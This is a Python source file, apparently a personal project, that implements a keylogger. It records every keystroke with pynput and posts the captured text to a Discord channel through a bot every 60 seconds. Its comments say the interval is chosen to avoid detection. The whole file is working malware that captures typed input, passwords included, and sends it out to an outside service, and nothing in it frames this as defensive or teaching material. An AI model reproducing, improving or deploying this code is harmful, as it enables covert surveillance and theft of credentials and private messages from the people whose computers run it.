#sends a message every 60 seconds to avoid detection
#by high resource usage
#time.sleep() used but no async blocking
import discord,time
#from discord.ext import tasks #abandoned
from pynput import keyboard
import functools

# Replace with your bot token and channel ID
token_list = open("C:/Users/Yusuf/work/pyth/HOME/.idea/tokens/messenger_pigeon.txt","r")
token_list = token_list.readlines()
token_list = token_list[0].split()
token_list[1] = int(token_list[1])
DISCORD_TOKEN = token_list[0]
CHANNEL_ID = token_list[1]  #Channel ID can be altered in token file

# Create a Discord client instance
client = discord.Client(intents=discord.Intents.default())

# To store key presses
global key_log
key_log = []

@client.event
async def on_ready():
    global key_log
    key_log = []
    channel = client.get_channel(CHANNEL_ID)
    await channel.send(f'{client.user} is in flight')
    print(f'{client.user} is in flight')
    while True:
        time.sleep(60) #should sleep for 60s
        message=""
        while key_log!=[]:
            if key_log[0]=='[space]':
                message+=(' ')
                key_log=key_log[1:]
            
            elif key_log[0]=='[enter]':
                #if len(message) == 0: #stops repeated enters (will comment all of line out)
                message+=(" [enter] ")
                key_log=key_log[1:]
            
            elif key_log[0]=='backspac':
                message+=(' [backspace] ')
                key_log=key_log[1:]
            
            else:
                message+=(key_log[0])
                key_log=key_log[1:]
    
        if (len(message) == 0) or (message == ""):
            pass
        else:
            await channel.send(message)

# Keyboard event listener - called on key press
def on_press(key):
    try:
        key_log.append(key.char)  # Get character of the key
        print(key.char)
    except AttributeError:
        # For special keys (like space, enter, etc.)
        if key == keyboard.Key.space:
            key_log.append('[space]')
        elif key == keyboard.Key.enter:
            key_log.append('[enter]')
        else:
            key_log.append(f'{key.name.strip("key")}')  # Display as [keyname]

# Start listening to keyboard events
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Start the Discord bot
client.run(DISCORD_TOKEN)